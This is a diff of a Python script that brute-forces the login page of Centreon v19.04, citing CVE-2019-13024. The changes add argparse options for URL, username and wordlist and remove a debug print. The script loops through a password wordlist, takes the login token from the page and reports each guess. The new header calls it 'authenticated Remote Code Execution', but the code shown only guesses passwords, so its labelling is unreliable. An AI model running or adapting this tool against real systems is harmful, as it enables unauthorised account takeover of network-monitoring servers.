@@ -1,10 +1,9 @@
 #!/usr/bin/python
 
 '''
-# Title: Centreon v19.04 Login Bruteforce
+# Exploit Title: Centreon v19.04 authenticated Remote Code Execution
 # Date: 28/06/2019
-# Exploit Code Snippet Author: Askar (@mohammadaskar2)
-# Scripted by Mohin Paramasivam (Shad0wQu35t)
+# Exploit Author: Askar (@mohammadaskar2)
 # CVE : CVE-2019-13024
 # Vendor Homepage: https://www.centreon.com/
 # Software link: https://download.centreon.com
@@ -13,23 +12,26 @@
 '''
 from termcolor import colored
 import requests
+import os
 import sys
 import warnings
+import argparse
 from bs4 import BeautifulSoup
 
 # turn off BeautifulSoup warnings
 warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
 
-'''if len(sys.argv) != 6:
-    print(len(sys.argv))
-    print("[~] Usage : ./centreon-exploit.py url username password ip port")
-    exit()
-'''
+parser = argparse.ArgumentParser(description='Centreon Login Bruteforce')
+parser.add_argument('--url',help='Centreon URL eg: http://10.12.1.288/centreon')
+parser.add_argument('-u',help='Username')
+parser.add_argument('-w',help='Wordlist')
+args = parser.parse_args()
 
 
-url = sys.argv[1]
-username = "admin"
-password_wordlist = sys.argv[3]
+
+url = args.url
+username = args.u
+password_wordlist = args.w
 
 password_file = open(password_wordlist,"r")
 
@@ -61,7 +63,7 @@ while success==0:
         print("[+] Login token is : {0}".format(token))
 
 
-        print(login_request.text)
+        #print(login_request.text)
 
 
 
@@ -71,9 +73,10 @@ while success==0:
             success =1
 
         else:
-
             print username +":" + password + colored('(INVALID)','red')
             success = 0
+            
+            
 
 
 	   
